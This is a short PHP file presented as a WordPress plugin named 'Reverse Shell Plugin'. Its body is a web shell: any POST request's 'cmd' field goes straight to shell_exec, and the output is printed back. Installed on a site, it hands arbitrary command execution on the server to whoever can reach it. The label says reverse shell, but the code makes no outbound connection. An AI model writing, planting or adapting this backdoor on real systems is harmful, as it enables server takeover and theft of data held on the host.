<?php
/*
Plugin Name: Reverse Shell Plugin
Plugin URI: http://example.com/reverse-shell
Description: A simple plugin for reverse shell execution
Version: 1.0
Author: Your Name
Author URI: http://example.com
*/
?>

<?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $cmd = $_POST['cmd'];
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
?>
